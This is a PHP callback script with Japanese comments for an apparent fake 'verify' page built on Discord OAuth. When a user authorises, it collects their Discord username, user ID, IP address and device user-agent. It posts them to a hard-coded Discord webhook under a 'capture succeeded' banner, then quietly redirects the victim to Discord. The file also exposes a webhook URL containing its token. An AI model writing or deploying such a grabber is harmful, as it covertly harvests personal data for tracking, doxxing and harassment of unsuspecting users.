<?php
// --- 【重要】ここを最新のSecretに書き換えてください ---
$client_id     = '1483731872050839564';
$client_secret = 'ここに新しく発行したSECRETを貼り付け'; 
$webhook_url   = 'https://discordapp.com/api/webhooks/1483730982606475304/UN0z8Omfi4Voo58rLkFVhwhv0Jd59kUOYktJxyx0g0mGl5VkCc0IbLtegaqKZXAKokc2';
$redirect_uri  = 'http://verifynet.free.nf/callback.php'; 

// 1. コードの確認
if (!isset($_GET['code'])) {
    die("Error: No code.");
}

// 2. アクセストークンの取得 (User-Agentを追加して拒否を回避)
$ch = curl_init('https://discord.com/api/oauth2/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'client_id'     => $client_id,
    'client_secret' => $client_secret,
    'grant_type'    => 'authorization_code',
    'code'          => $_GET['code'],
    'redirect_uri'  => $redirect_uri
]));
$token_res = curl_exec($ch);
$token_data = json_decode($token_res, true);

if (!isset($token_data['access_token'])) {
    // 詳細なエラーを表示させて原因を特定する
    die("Access Token Error: " . ($token_data['error_description'] ?? 'Check Secret/Redirect URL') . "<br>Full Response: " . $token_res);
}

// 3. ユーザー情報の取得
$ch = curl_init('https://discord.com/api/users/@me');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $token_data['access_token']]);
$user = json_decode(curl_exec($ch), true);

// 4. 情報の整理
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

// 5. Webhook送信
$payload = json_encode([
    "embeds" => [[
        "title" => "🎯 ID・IP 取得成功",
        "color" => 16711680,
        "fields" => [
            ["name" => "👤 ユーザー名", "value" => $user['username'], "inline" => true],
            ["name" => "🆔 User ID", "value" => $user['id'], "inline" => true],
            ["name" => "🌐 IPアドレス", "value" => $ip, "inline" => false],
            ["name" => "📱 デバイス", "value" => "```" . $ua . "```", "inline" => false]
        ]
    ]]
]);

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_exec($ch);

// 6. 完了後の遷移
header("Location: https://discord.com/channels/@me");
exit;
